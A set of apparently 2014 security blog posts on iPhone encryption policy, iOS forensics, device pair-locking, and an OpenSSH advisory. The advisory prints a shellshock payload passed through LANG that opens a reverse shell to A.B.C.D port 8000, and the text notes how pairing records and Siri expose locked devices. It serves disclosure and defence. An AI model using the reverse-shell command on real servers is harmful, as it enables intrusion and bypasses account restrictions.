So Apple fixed their security - so what? Well, they fixed it right… and that means that they fixed it so they, themselves, couldn't break into it… which is the _only way to do encryption right_. They can't break into their own phones, at least without using a password breaking tool. That is significant. So in fixing their security, Apple has now said to law enforcement, "_we're sorry, but we'd have to perform sophisticated attacks against our own products in order to even have a chance at dumping data for you._" What they haven't said, but is very much also the truth, is "_we've made our products secure enough so that we can't even hack them … and can keep you safe from criminals, keep our public officials safe from spy agencies, and can keep our military safe from foreign governments - all looking to spy on, eavesdrop on, steal data from, and learn crucial intelligence to harm America_ (insert any other country here)".

So who are our enemies and just how high-tech are they? China and Russia are two of the biggest technically capable countries that are hostile towards the US, and have massive intelligence agencies just like the NSA, whose job is to hack our military, diplomats, officials, corporate executives, and anyone else they think is important. There are many others, and the threat is very real. You never hear about most of the Charlie Millers of the world, because they're too busy hacking foreign dignitaries. Many of those guys work for other countries and hack us and our iPhones.

I have no doubts that the FBI (and other agencies) have used the data they used to be able to dump to solve crimes. In fact, I _know_ this to be true. I've helped them do this a number of times in the past myself; when my forensics techniques came out, they issued a major deviation within their agency just to allow their agency to use my tools. As early as 2008, I was working with the lab director of one of the FBI's regional computer forensics labs, who sent me an email citing these two specific instances where my tools were crucial:

_As far as cases:_

_1) Received a Iphone on a terrorism matter. The phone contained photos of unknown associates, sms messages of value and phonebook information of value. Because of the iphone, law enforcement was able to identify previous unknown terrorists._

_2) On a Child assault case, the subject, a friend of the family's, assaulted a sleeping 13yr female. He took pictures of the entire incident with his iphone. After the assault he was nervous and threw his phone in a dumpster. The iphone was recovered from the dump. After charging, all the pictures were recovered. The victim did not report the incident for a couple of weeks, there was no physical evidence. The only evidence is the victim's testimony and the iPhone._

_Thank you_

So you must be thinking, "well then why are you against Apple helping law enforcement?". You clearly misunderstand the conversation. This isn't about choosing to help law enforcement. I've done that for years. This is about the idea of embedding backdoors into technology in order to help law enforcement. We're not talking about Apple choosing whether or not to turn over data to law enforcement that _they are in possession of_. We are talking about Apple choosing whether or not to _insert a backdoor into their own products_ in order to _obtain data_ that they currently do not possess. We are talking about _weakening the security of Apple's products_ now that they have finally pulled their heads out and gotten security right for the first time. These poor decisions in security affect not only the criminals and terrorists in that email, but they affect everything ranging on up to our national security.

This, I am against. This is what going too far looks like. What I did early on in my career in the forensics world to help law enforcement was _hacking_. I learned how to hack into devices and circumvent operating system mechanisms to get law enforcement the data. It wasn't about backdoors, it was about the cat-and-mouse game of beating the technology. Hacking actually helps to _improve_ the security of a product, when done by the right people… it exposes vulnerabilities (see some of my recent papers), which often leads to a fix, and improved overall security. This is a far cry from what Apple was doing (which I don't even consider hacking), and that was using their own skeleton key to the iPhone to dump data for the cops. This skeleton key is one of the very things that had weakened security so much that I was able to get in there in the first place through hacking! Certainly if I could do it, some Russian hackers getting bankrolled by Putin's intelligence agencies could do it (they have better toys).

Today, there are a number of commercial solutions on the market that can penetrate and dump older iPhone models. Depending on the firmware version and hardware model, your mileage varies from, "some of the user data" to "everything on the device". These commercial "law enforcement" tools are sold to any country with a fat wallet. They are also sold to non-law enforcement entities such as large businesses. They are also sold to anyone who has the money to buy them, and are pirated widely among the criminal community too.

Now consider that criminals, such as the ones who released all of those stolen nude images of celebrities, have the same law enforcement forensics tools that our police do… and all of this made possible due to the weakened state of security that previous versions of iOS have been in? Is it a good thing? On the one hand, we can catch a child predator who only ever used his phone and somehow left no online trace. On the other hand, dozens of people's privacy are violated in the most intimate way. Some of the victims' GPS data were pulled and circulated from their stolen files, among sex websites, so that sexual predators could physically stalk these women… so we're now talking about more than the fappening; we're talking about real sexual assaults possibly taking place against these women. Have we really improved anything by having weak security?

There is plenty of what people consider "good" resulting from being able to dump data from the iPhone. In my seven years working in iOS forensics, there's also a lot of bad - real crime that has resulted from Apple's past design decisions. For this, I'm fumed at the old Apple, for letting their ignorance (or arrogance, depending) help, by design, make certain crimes so easy to pull off.

We've also seen, first hand, through the Snowden leaks and other leaks, just how abusive our own government is towards its own people, and how little certain agencies regard our constitutional rights. While I have great respect for many in law enforcement, I've also seen that position of authority abused in a number of ways. Sure, it's a small percentage of bad apples, and most cops I've worked with are upstanding guys… but it still happens.

Consider now that laptops have full disk encryption, and are protected often with complex passwords… law enforcement (to my knowledge) doesn't have a backdoor, and unless they can find a password, they might as well throw the drive out as evidence. Yet cases are still getting solved. Murderers and rapists are still getting convicted. There is such a mount of peripheral evidence out there that only a small handful of cases are even likely to have the iPhone be the sole smoking gun to begin with. Cops have iCloud data, iCloud backups, call records, voicemail records, text messages from the carrier (if obtained within a certain retention period), gmail, email, web logs, trap and trace, proxy logs, not to mention copies of data from other people involved or from the victims themselves, desktop backups (if available), sometimes even a desktop (as many criminals don't use encryption at all). Add to that they're eavesdropping on the whole damn Internet. There is a _mountain_ of data with which to pursue and investigate most cases. While it has happened, it's been very rare that I've consulted on a case where the data on the iPhone has been the sole smoking gun.

There's been an air of laziness in the forensics community because of the great technical capabilities that LE has been given over the past several years. Many forensic examiners themselves admit that they think others in their field are lazy. You don't have to do any police work in a lot of cases…just push a button, and find the penis. Literally, I've known some examiners who have called their job a game of "find the penis". How sad.

Many of these cases will still get solved with good old fashioned detective work. In fact, the loss of these capabilities, for at least some examiners, is more like pulling a toy away from a child so that they have no choice but to get up and read a book. Much of the FBI's crying is, in my opinion, complaining about the fact that they'll have to work harder to do their job. Fine. These guys used to kick ass at what they did - without tools like this. I'm all for getting some of the fat ones who've spent too much time behind a desk back on the treadmill and out in the field.

We know it's technically possible to install back doors … the real question is what level of privacy are you willing to give up, just to assist law enforcement? Should we allow the police to control every webcam in our house? Should we install cameras in our bedroom and allow law enforcement to record everything that goes on in every house, and only play it back if there's a crime reported? (Do you really trust them that much? Because guys I know wouldn't trust their fellow detectives/agents that much). Should we force glove manufacturers at Macy's to install latent fingerprint contact paper inside all of the fingers to their gloves, so that criminals can't conceal their fingerprints when committing a crime? There are certainly an infinite number of things that we can do to destroy our own privacy just for the sake of helping law enforcement with their cases. Unless you're an insane human being, none of these sounds good to you. You probably understand that back-dooring your webcams also means that a criminal could find his way in (and many have). You probably understand that having a camera in your bedroom will lend you no privacy, and force you to live in fear of being embarrassed. You probably understand that it makes no sense to ban gloves, just for the sake of exposing everyone's fingerprints to the cops. Nor does it make sense to give the cops all your safe combinations, keys to your house, or any other of the analogies that work here.

These very same arguments are all identical to the argument we are having now about security on the iPhone. The FBI is not asking for Apple to "cooperate" in investigations. The FBI, whether they realize it or not, is asking Apple to back-door their own products so that Apple can still let them in, and so that they don't have to work so hard to do their jobs. Now there are some great guys at FBI, working hard - they are the ones who aren't freaking out right now, because they are comfortable with their skill set, and know they can continue to beat the bad guy. The rest of the bureau could stand to learn that they're not entitled to everything they ask for just to make their job easier.

FBI is probably asking Apple to be willing to brute force their own PIN codes, or perhaps run a dictionary attack against passcodes, to break the encryption on their own devices. There's really no other way to help the FBI at this point, other than to either back-door the iPhone, or to weaken their own encryption enough so that it can be brute forced / attacked. Both of these choices hurt your privacy, and they hurt our national security. It would also be a disaster for Apple PR for us to learn that Apple is attacking their own customers' data.

While perhaps a heartfelt utopian ideal, the fact is that demanding back doors for law enforcement is selfish. It's selfish in that they want a backdoor to serve their own interests. Non law-enforcement types, such as Orin Kerr, a reporter who wrote a piece in the Washington Post supporting FBI backdoors (and then later changed his mind), are being selfish by demanding that others give up their privacy to make _them_ feel safer. This is the absolute opposite of a society where law enforcement serves the public interest. What Kerr, and anyone supporting law enforcement back doors, really wants, is a society that caters to their fears at the expense of others' privacy.

While we individually choose to trust the law enforcement we come in contact with, government only works if we inherently and collectively distrust it on a public level. Our public policies and standards should distrust those we have put in a position to watch over us. Freedom only works when the power is balanced toward the citizens; providing the government with the ability to choose to invade our 1st, 4th and 5th Amendment rights is only an invitation to lose control of our own freedom. Deep inside this argument is not one of public safety, but a massive power grab away from the people's right to privacy. Whether everyone involved realizes that, it is privacy itself that is at stake.

Our founding fathers were aware that distrusting government was essential to freedom, and that's why they [used encryption](http://lfb.org/thomas-jefferson-used-encryption/). In fact, because of their own example in concealing correspondence, one can make an even stronger case supporting encryption as an instrument of free speech. The constitution is the highest law of the land - it's above all other laws. Historically, our founding fathers guarded all instruments available that protect our freedom as beyond the law's reach: The Press, Firearms, Assembly. These things provided information, teeth, and consensus. Modern encryption is just as essential to our freedom as a country as firearms, and are the teeth that guarantees our freedom of speech and freedom from fear to speak and communicate.

Encryption today still just as vital to free speech as it was in the 1700s, and to freedom itself. What's at stake here is so much bigger than solving a crime. The excuse of making us safer has been beaten to death as a means to take away freedoms for hundreds of years. Don't be so naive to think that this time, it's any different.

[permalink](http://www.zdziarski.com/blog/?p=3894). 

  


Synopsis:

The sshd daemon used in OpenSSH supports a ForceCommand directive, allowing shell logins to be restricted to specific commands. This is often used in configuring sshd for cvs/git accounts, restricted shells, or management scripts. The ForceCommand directive can be employed system wide, or just for specific users.

Vulnerability:

By default, sshd is configured to allow the LANG environment variable to be pass through prior to execution of the restricted shell. On systems vulnerable to the bash/shellshock vulnerability, LANG can be set in such a way that spawns a remote shell or executes other code on the server, effectively bypassing the forced command and allowing full account access. This can be taken advantage of after the user has authenticated via ssh, and so such systems are only at risk from abuse by their own authorized users, however such users are normally restricted from being able to execute arbitrary commands, and so this is more of a privilege escalation in such cases. This vulnerability can be even more dangerous on systems with open restricted accounts, in which case it becomes an RCE risk.

The following code invokes an ssh session that will use shellshock to spawn a remote shell on port 8000 to the IP address at A.B.C.D.
    
    
    $ env LANG='() { :; }; /bin/bash -i >& /dev/tcp/A.B.C.D/8000 0>&1' ssh target_host

Local demonstration on Mac OS X Mavericks:

![IMG_0072](http://www.zdziarski.com/blog/wp-content/uploads/2014/09/IMG_0072.png)

Demonstrated remotely on a vulnerable Linux machine:

![Screen Shot 2014-09-26 at 10.53.07 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/09/Screen-Shot-2014-09-26-at-10.53.07-AM-1024x628.png)

> _[Screen Shot 2014-09-26 at 10.53.07 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/09/Screen-Shot-2014-09-26-at-10.53.07-AM.png)_

Recommendations:

It is recommended that the following AcceptEnv directives be removed from sshd_config:
    
    
    AcceptEnv LANG LC_*

Other standard installations of OpenSSH also include other AcceptEnv directives, which should be removed. For example, many Linux distributions also accept LANGUAGE, XMODIFIERS, and other environment variables. This will prevent sshd from passing through the LANG and related environment variables to the forced command. Other environment variables may still be affected, however, and so a full solution is to patch for the shellshock vulnerability.

  


There's been a lot of confusion about Apple's recent statements in protecting iOS 8 data, supposedly stifling law enforcement's ability to do their job. FBI boss James Comey has publicly criticized Apple, and essentially blamed them for the next hundred children who get kidnapped. While Apple's new security improvements have made it a lot harder to get to certain types of data, it's important to note that there are still a number of techniques that can be employed against iOS 8, with varying levels of success. Most of these are techniques that law enforcement is already doing. Some are part of commercial forensics tools such as Oxygen and Cellebrite. The FBI is undoubtedly aware of them. I'll outline some of the most common ones here.

I've included some tips for those of us who are concerned about data security. Security researchers, journalists, law abiding activists, diplomats, and many other types of high profile individuals should all be practicing good data security, especially when abroad. Foreign governments are just as capable of performing the same forensics techniques that our own government is capable of, and there is an overwhelming amount of information suggesting that all of these classes of individuals have been targeted by foreign governments.

**Dumping With a Pair Record**

The guys over at Black Bag [wrote a great piece](https://www.blackbagtech.com/blog/2014/09/24/ios-8-and-its-impact-on-investigations) outlining the forensic seizure practices that law enforcement agencies should use to properly secure an iOS device. They made a few important observations, too. First, they acknowledged that, prior to iOS 8, LE has been using the file_relay service as a backdoor to dump data from iOS with a pairing record, as I've outlined in numerous [papers](http://www.sciencedirect.com/science/article/pii/S1742287614000036), [talks](http://www.zdziarski.com/blog/?p=3441), and [articles](http://www.zdziarski.com/blog/?p=3549). Commercial tools have been around for a year or two to do this very thing. Apple finally fixed this with iOS 8, by closing off the service (and severely downplaying its capabilities), however a number of other services can still be abused to obtain clear text copies of third party application data and the user's media folder, as [I previously outlined](http://www.zdziarski.com/blog/?p=3875). Black Bag also recommends that law enforcement incorporate keeping the device from shutting down in their seizure practices. This is because the encryption locks when the device is rebooted. Due to a [protection mode bug](http://www.zdziarski.com/blog/?p=3890), however, even after a reboot some third party application files and media files are still readable without first unlocking the device. The data that can be dumped in clear text with a pair record in iOS 8 is limited to only media and third party application data - which is a significant improvement over previous versions of iOS, which gave up almost all the user data.

What this means to you: law enforcement seizure practices have already begun gravitating toward seizing desktops and laptops that are potentially paired with your devices. This is most easy to do at an airport during a customs check, but also during an arrest. When going through a security checkpoint, or any time you feel as though your equipment might be at risk of seizure, it's important to power off your iOS device to lock the encryption. Of course, make sure your laptops have full disk encryption and are completely powered down going through security checkpoints.

**Attack the Backup Encryption**

There are two ways to get a copy of a backup: off of the subject's desktop machine, or if the device is unlocked (or the passcode / fingerprint is compelled from the suspect), one can be made. If the user didn't use a backup password, the backup gives up all of the user data on the iPhone. But even if you set a backup password, the encrypted backups can be attacked with tools such as Elcomsoft Phone Password Breaker. If you use a weak backup password, password breakers could potentially run on desktop machines (which are much faster than the iPhone) and attack the encryption used to protect the backup. If cracked, all of the data on the device becomes accessible. This could take years, if you use a sophisticated passcode, however many criminal cases have been known to carry on for years.

What this means to you: it's critical you set a complex backup password and enable pair locking on your device. More on this in the conclusion.

**Monitor the Device via Cell Towers**

Cell tower triangulation (location) has been around since the 1970s. Call and data interception, eavesdropping, trap and trace, and persistent monitoring are all also possible from the cell tower, regardless of the model of phone. Even a completely locked down iPhone or Blackphone is susceptible to this kind of monitoring. The federal government has full access to cellular companies who can, with a warrant, perform all of these functions.

What this means to you: as long as you are carrying your device, you are susceptible to eavesdropping. To ensure the privacy of your in-person conversations and your location, leave the device at home, or consider a good quality faraday bag. Simply powering the device off will not guarantee privacy.

**iCloud Backups / Photo Stream**

As I've mentioned in previous posts, iCloud's default behavior is to enable photo stream and backups. If you haven't disabled either of these, your data is sitting on iCloud, and can be acquired with a search warrant to Apple.

What this means to you: you shouldn't be using iCloud to store any data you don't want to be subject to government… and not just your government: Apple has filed amicus briefs with the court complaining that international treaties have been broken in some cases, where governments have obtained data not stored on their own soil, or about individuals who are not citizens of the requesting country.

**Abusing Siri**

Unless you turn Siri off while locked (in Touch ID and Passcode settings), anyone (not just law enforcement) can state a number of commands to read your contacts, incoming texts, email, and other data from your phone by simply abusing the Siri interface. I have seen a few exhaustive lists of commands used widely in LE to read the data off locked devices using Siri, and have even included these commands in some of my classes to law enforcement / military forensics investigators. Touch ID makes it much easier to turn Siri off while locked; you can simply press Home with your thumb, authenticate, then press and hold the Home button again to invoke Siri.

What this means to you: you should shut off Siri when locked to avoid letting someone interrogate her.

**Third Party Trace**

While the data on your iPhone may be more secure, the trace you leave behind while communicating with others online leaves trace on other computers. There's email, gmail, texts and photos existing on third party devices, search logs, proxy logs, NSA Prism data (whatever that looks like), Internet packet interception (call register), online account seizure, forum posts (which can be acquired under subpoena), and if you're a really naughty boy (or girl), there's also NSA's TAO group to hack into your machines.

What this means to you: you should use full disk encryption, not send anything out into the ether that you want to keep private, employ good network/device security, and especially good OPSEC. Use tools such as PGP to ensure that emails get encrypted. Use Signal on an iPod (which doesn't have a tappable baseband like the iPhone does) to make secure phone calls. Use other forms of encryption to help ensure secure communication.

**Desktop Trace**

While the iPhone sports encryption that's on by default (once you set a passcode), most criminals have proven to be too dumb to use encryption on their desktops. As a result, iPhone backups, pairing records, as well as copies of all sorts of incriminating data that may be stored on a suspect's desktop machine is child's play to intercept.

What this means to you: encrypt your desktops with full disk encryption, and don't leave your computers lying around screen-locked. If you're a journalist, diplomat, or CEO and have exceedingly sensitive information on your laptop, consider using secondary encryption such as a TrueCrypt container with hidden volume, for that data.

**ZRT and Analog Tools**

ZRT and other such tools are ways to streamline photographing / video recording the data on the iPhone screen when there are no forensic techniques available to access the device. If the suspect is compelled to give up their passcode or fingerprint, and the phone can't be dumped, tools like ZRT helps to ensure the data visible on the iPhone's screen is admissible in court.

What this means to you: anything you can visible see on your iPhone may be readable into evidence, if you are compelled to give up your passcode or fingerprint. To ensure your fingerprint isn't "faked", at least ensure that your device is powered down when going through a security checkpoint, or any other circumstances where you fear the device may be seized. This will cause the device to require a passcode upon boot.

**Conclusions**

Kidnapping is generally a very low-tech crime; it's one step above smash-and-grab. So you're not dealing with very sophisticated criminals here. In all likelihood, even their iPhones aren't properly secured, and with a PIN or pair record, a complete backup could be dumped from the device. On the other hand, journalists, diplomats, and the like have a very strong motivation to want to adequately protect their data from foreign governments (and in some cases, their own government).

I can't stress how important it is for those interested in data security to [pair lock](http://www.zdziarski.com/blog/?p=2589) their device. Pair locking prevents anyone from creating a backup or dumping any data, even if they have the passcode or your fingerprint. Even if your backup is encrypted, it is still susceptible to attack by EPPB and other tools, and so a big step to preventing that is to prevent the phone from being willing to generate a backup. Properly protect your pair records by encrypting your desktop machine. Maybe at some point in the future, Apple will encrypt the pairing record with a password (stored on the keychain?) so that they can't be stolen and used on any other computer to access your content.

Also ensure you set a good, complex passcode and not just a four-digit PIN. While Apple doesn't appear to be breaking passcodes, if anyone is able to get root level code execution on the device, a four digit PIN can be easily brute forced. The Touch ID makes it much easier to set a very complex passcode. In addition to this, set a very complex backup password that would be very hard to crack with server-grade hardware. I'd recommend at least 16-20 characters, and avoid using words or phrases. Use many symbols, and even consider using alternative keyboards on devices that permit it (such as emoji, unicode or Greek incorporated into your passcode). Mac desktops let you do this, but unfortunately, the iPhone doesn't yet.

The FBI's recent technical arguments about the iPhone are not at all credible. There are still many ways in which law enforcement can, and will, seize data from criminals' iOS devices. Those with the know-how to properly secure their devices from this type of seizure are not at all likely to be the kind of people who commit the crimes the FBI is citing in their hypothetical examples. The FBI isn't the only one with these capabilities, and if you're in a likely class of people to be targeted, you may consider taking these steps to help prevent your data from being exposed.

  


_Last updated for iOS 8 on September 28, 2014_

As it turns out, the same mechanism that provided iOS 7 [with a potential back door](http://www.zdziarski.com/blog/?p=2571) can also be used to help secure your iOS 7 or 8 devices should it ever fall into the wrong hands. This article is a brief how-to on using Apple's Configurator utility to lock your device down so that no other devices can pair with it, even if you leave your device unlocked, or are compelled into unlocking it yourself with a passcode or a fingerprint. By pair-locking your device, you're effectively disabling every logical forensics tool on the market by preventing it from talking to your iOS device, at least without first being able to undo this lock with pairing records from your desktop machine. This is a great technique for protecting your device from nosy coworkers, or cops in some states that have started grabbing your call history at traffic stops.

With iOS 8's new encryption changes, Apple will no longer service law enforcement warrants, meaning these forensics techniques are [one of just a few reliable ways](http://www.zdziarski.com/blog/?p=3924) to dump forensic data from your device (which often contains deleted records and much more than you see on the screen). Whatever the reason, pair locking will likely leave the person dumbfounded as to why their program doesn't work, and you can easily just play dumb while trying not to snicker. This is an important step if you are a journalists, diplomat, security researcher, or other type of individual that may be targeted by a hostile foreign government. It also helps protect you legally, so that you don't have to be put in contempt of court for refusing to turn over your PIN. The best thing about this technique is, unlike my previous technique using _pairlock_, this one _doesn't_ require jailbreaking your phone. You can do it right now with that shiny new device.

# About Pairing Relationships

A _pairing_ is a trusted relationship with another device, where a computer is granted privileged, trusted access on the iPhone. In order to have the level of control to backup the phone, download personal data, install applications, or perform other such tasks on an iOS device, the machine it's connected to must be paired with the device. This is what iTunes and Xcode do to talk to the phone, but also what forensic imaging tools and a number of free hacking tools do as well. Once paired, these keys remain stored on the device indefinitely, until you perform a restore or wipe the phone some other way.

_NOTE: As of iOS 8, you can reset all pairing relationships by using Settings > General > Reset > Reset Location & Privacy, or Reset Network Settings. This will delete your existing pairing relationship with your desktop (and all other computers), however it will not remove the pair-lock. This means you will have to remove the pair-lock in order to pair with your own desktop again. This can only be done using either Configurator's supervisor certificates, or by entering a removal password that you may set when you set up the lock._

Pairing records can be used to access the phone even when it's locked, over USB (and in iOS 7 and older, over WiFi). A pairing record is like a skeleton key to your iPhone or iPad. With it, someone can download all of your personal data from any application (including third party applications), install invisible applications (even onto your non-jailbroken phone) that run in the background, activate the device's built-in packet sniffer to monitor your network traffic, and much more nefarious things. Much of this can also be done while the device is locked, regardless of whether you're using a fingerprint reader or not, as long as you have a pairing record. Some level of personal data [can also be acquired](http://www.zdziarski.com/blog/?p=3875) from the phone regardless of whether backup encryption is turned on or not, and a number of forensics tools and open source tools (like iMobileDevice) know how to get to this decrypted data.

# Pair-Locking Explained

So what's the best way to protect yourself from all of these? Pair-lock your device. By pair-locking your device, you're preventing anyone from establishing a new trusted relationship with the device. So unless they're able to steal the pair record your desktop has, they won't be dumping data from your phone, installing malicious applications, or doing anything else to it - even if the phone leaves your physical possession, and even if you are compelled to give up the passcode, or unlock it with your fingerprint. When a device is unwilling to create a new pairing session with a desktop machine, nothing can talk to it through its proper interfaces - not forensics tools, not iMobileDevice tools, nothing. And that means unless you have a really old phone with a hardware exploit, there's no way they'll be able to dump data from it, since Apple's no longer able to service warrants either for iOS 8 devices.

As I said, in order to get to the data on your device, you'll need the pair record from your desktop. This means that you should be encrypting your desktop machine if you want to protect that relationship. It also means that you should be aware that you, yourself, will be unable to access your device if you lose this pairing record. On a Mac, you'll find a copy of your pairing record in /var/db/lockdown. Guard it well… Maybe even off the computer if you don't sync often.

# One Big Caveat

I had previously documented a method to install profiles on the device without first supervising it, but it looks like the pair-lock feature does not carry over onto the device unless you have supervised it. Unfortunately, you'll need to supervise your device in order to pair lock it.

One big caveat to supervising your device is that you _cannot_ _under any circumstances_ restore a backup of data from the device from before it was supervised, otherwise you'll undo everything. What this means is that you have to start fresh, with a brand new install of iOS. There does not appear to be any way around this, meaning you'll lose everything on the phone (and have to start from scratch).

If you decide later that you don't want to supervise the device, you _can_, however restore an iTunes backup. This will blow away the supervised configuration, and also your pair lock, but it will let you restore all of your backed up content.

# Getting Started

To get started, the first thing you'll want to do is disconnect your iDevice from your computer, then _Reset Location & Privacy_. This will flush out any existing pairing relationships the phone has with other desktop machines. This is important, in the event that any existing pairings have been created that you don't want (or might not know about).

Once you've reset privacy settings on the device, plug it back into your desktop computer, and it will establish a new pairing relationship with it again. This will create a file on your Mac in _/var/db/lockdown_ with a filename named after the _UDID _of your device. If you don't know what that is, you can open iTunes and click on the serial number of the phone to display the UDID. You might want to back up this pair record somewhere secure, as it will be the only one capable of talking to the phone.

One last thing you'll want to do to get started it turn off _Find my iPhone_. Configurator won't provision a device until you've done so; you can turn it back on once you've got everything set up.

# Apple Configurator

Once you've got your pairing reset, download the latest Apple Configurator from the Mac App Store. This is a free download. This article has been updated specifically for Configurator 1.6 on iOS 8.

The Configurator is designed to enroll devices in enterprise (corporate) profiles, to place restrictions on them and allow them to be supervised by a security team. You'll be using it to enroll your own device in your own private security policy.

Before you do anything to configure an iPhone, visit the Configurator's _Preferences_, and turn off the feature that tells Configurator to uninstall applications that it doesn't specifically install. If you don't do this, then the next time you connect your device to Configurator, it will forcibly remove everything you've installed since you provisioned it (ouch!). Turn the following feature off before proceeding.

![Screen Shot 2013-09-20 at 3.10.23 AM](http://www.zdziarski.com/blog/wp-content/uploads/2013/09/Screen-Shot-2013-09-20-at-3.10.23-AM.png)

> _Create a Backup in Configurator_

When a device is managed by with Configurator, _you can't restore from an iTunes backup_. If you do, it will blow away the user data on the device, which includes your managed configuration (and pair lock). If you'd like to create an additional backup archive of your data before proceeding, you can do this in Configurator just to be safe.

![Screen Shot 2014-09-29 at 11.30.39 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/09/Screen-Shot-2014-09-29-at-11.30.39-AM-1024x738.png)

> _[Screen Shot 2014-09-29 at 11.30.39 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/09/Screen-Shot-2014-09-29-at-11.30.39-AM.png)_

From the _Restore_ menu, select the _Create Backup _option. This will prompt you to save a backup archive to your computer.

![Screen Shot 2014-09-29 at 11.22.47 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/09/Screen-Shot-2014-09-29-at-11.22.47-AM-1024x738.png)

> _Prepare the Device_

To manage a device, you'll need to first prepare it. This will cause Configurator to erase the device completely, download and install the latest copy of iOS onto it, and "reset" the device into a supervised mode.

From the _prepare_ screen, switch the _Supervision_ switch to the _on_ position. Your console should look similar to the one below.

![Screen Shot 2014-09-29 at 11.36.34 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/09/Screen-Shot-2014-09-29-at-11.36.34-AM-1024x738.png)

> _[Screen Shot 2014-09-29 at 11.36.34 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/09/Screen-Shot-2014-09-29-at-11.36.34-AM.png)_

Decide if this machine is the only machine you'll _ever_, and I mean _ever_, want to pair this phone with. If it is, then un-check the checkbox named, _Allow devices to connect to other Macs_. If, on the other hand, you might want to allow this phone to some day pair with other computers, then leave this box checked. I leave mine turned on, and instead manage that restriction through a profile, simply because my laptop could unexpectedly get stolen, or fail. In those cases, I can use the password removal option in the profile to remove the pair lock, so that I won't have to erase my phone to un-manage it.

If you've opted to allow the device to (sometimes) connect to other computers, you'll next want to create a profile, which you'll use to lock and unlock the pairing. Enter a name for your supervision profile. I simply call mine "Managed Device Profile".

# Creating a Profile

Regardless of which option you use, you'll create a new profile, which will contain your pairing restrictions. If you want to be able to remove the profile from the device, you can set a password required to remove it on the device, or for best security, select _Never_.

_NOTE: If you live in, or plan to visit a country whose courts can compel you to give up your profile's removal password, it would be best to select the Never option, so that you cannot be held in contempt of court for not giving up your password._

Next, click on the _Restrictions_ tab and scroll down to the restriction titled _Allow pairing with non-Configurator hosts (supervised only)_. This is your lock switch. To disable any new pairing with the device, _uncheck_ this restriction. Later on, you'll be able to edit this profile whenever you want to pair the device with a new host.

![Screen Shot 2013-09-20 at 12.01.33 AM](http://www.zdziarski.com/blog/wp-content/uploads/2013/09/Screen-Shot-2013-09-20-at-12.01.33-AM.png)

> _[Screen Shot 2013-09-20 at 12.01.33 AM](http://www.zdziarski.com/blog/wp-content/uploads/2013/09/Screen-Shot-2013-09-20-at-12.01.33-AM.png)_

_NOTE: Other restrictions, such as iCloud restrictions, can help to ensure that the device never backs up to the iCloud, or uses the photo stream option. It is also a good idea to force encrypted backups. You can enable these and other restrictions depending on the level of security you want to guarantee on the device._

Once you've finished making these changes, save the profile. If you're simply installing it on a device as an unverified profile, the device will prompt you to install it.

When you are finished setting up the profile, click the _Prepare_ button at the very bottom of the Configurator. The Configurator will then download and re-install the iOS firmware, then set up your device to be managed.

# Post-Installation

Once the device comes back up, you'll go through the usual setup process. Once setup is complete, your device should refuse to pair with any computer, even if it's unlocked. You won't be prompted to Trust anything, because it will simply fail. Even if you lose your device or are compelled into unlocking it, a logical dump should be impossible, because forensics tools won't be able to pair with it. The system log on the device shows what's happening internally:
    
    
    Sep 19 23:53:59 lockdownd[52] <Notice>: 00241000 mc_allow_pairing: hostMayPairWithOptions said no
    Sep 19 23:53:59 lockdownd[52] <Notice>: 00241000 handle_pair: pair for BOGUS failed: PasswordProtected
    Sep 19 23:53:59 lockdownd[52] <Notice>: 00241000 set_response_error: handle_pair PasswordProtected

If you open up _Settings_ on your device when view the _Profiles _under _General_, you should see your pairing profile, and a restriction preventing the device from pairing with any new devices.

![IMG_0001](http://www.zdziarski.com/blog/wp-content/uploads/2013/09/IMG_0001.png)

If you set the profile up to be removable with a password (or _Always_, even), then you can remove the pairing lock at any time by just tapping remove. For ultimate security, set the removal to _Never_. Keep in mind, if you ever lose the supervisor certificates in your desktop's keychain, you may have to wipe your device in order to get the pairing profile off of it, which also means that if you lose (or wipe) your laptop, you will not be able to talk to it with a new machine until you wipe.

# Removing a Pairing Profile

Now lets say a few months go by and you decide you want to pair your device with a computer at work, or some other machine. If you set a removal password on the profile, you can enter that and simply remove the lock. If you didn't, then you'll only be able to remove the lock if you've supervised the device, which uses special supervisor certificates to authenticate on the device (stored on your keychain). To unlock the pairing in this fashion, you'll need the computer you originally set this up with (unless you've backed up your pairing record and set up Configurator somewhere else). Launch the Configurator and click on the Supervise tab and click on your device.

![Screen Shot 2013-09-20 at 12.48.10 AM](http://www.zdziarski.com/blog/wp-content/uploads/2013/09/Screen-Shot-2013-09-20-at-12.48.10-AM1.png)

> _[Screen Shot 2013-09-20 at 12.48.10 AM](http://www.zdziarski.com/blog/wp-content/uploads/2013/09/Screen-Shot-2013-09-20-at-12.48.10-AM1.png)_

In the profiles window, you should see the _Pairing Profile_ you created. Double-click on it, and bring up the same restrictions window you used to restrict pairing. Now, simply put a checkmark to allow pairing with non-Configurator hosts, and click _Save_. Click _Refresh_ and revisit the setting to ensure that the change took. You can then disconnect your device and connect it up to any other machine to pair with it. (NOTE: If you run into issues, try power cycling the device for the setting to take). You should be prompted with a _Trust_ dialog prior to pairing, just like old times. Just be sure to disable pairing again when you're finished, using the same steps.

The advantage to this technique is very good pairing security. In fact, in order to remove the supervision profile, the intruder would need to erase the contents of your device. Someone would need to have physical possession to and full access to both your iOS device and your desktop computer in order to undo this pairing lock to perform a forensic extraction or any other kind of analysis.

The disadvantage is that you can't simply decide you're going to pair while you're out somewhere. You can, if you made the profile removable, but then you'll need to reinstall the profile to lock pairing again. Which will require a desktop. Pairing has to be a conscious decision, and takes time to verify that you have rights to the device's content. Then again, shouldn't it have always been this way? It's a bit of a chore, but is well worth the added security.

  


One of the most popular App Store applications, Private Photo Vault (Ultimate Photo+Video Manager) claims over 3 million users, and that your photos are "100% private". The application, however, stores its data files without using any additional protection or encryption than any other files stored on the iPhone. With access to an unlocked device, a pair record from a seized desktop machine, or possibly even just a copy of a desktop or iCloud backup, all of the user's stored images and video can be recovered and read in cleartext.

![Screen Shot 2014-09-29 at 9.08.33 PM](http://www.zdziarski.com/blog/wp-content/uploads/2014/09/Screen-Shot-2014-09-29-at-9.08.33-PM-1024x682.png)

> _[Screen Shot 2014-09-29 at 9.08.33 PM](http://www.zdziarski.com/blog/wp-content/uploads/2014/09/Screen-Shot-2014-09-29-at-9.08.33-PM.png)_

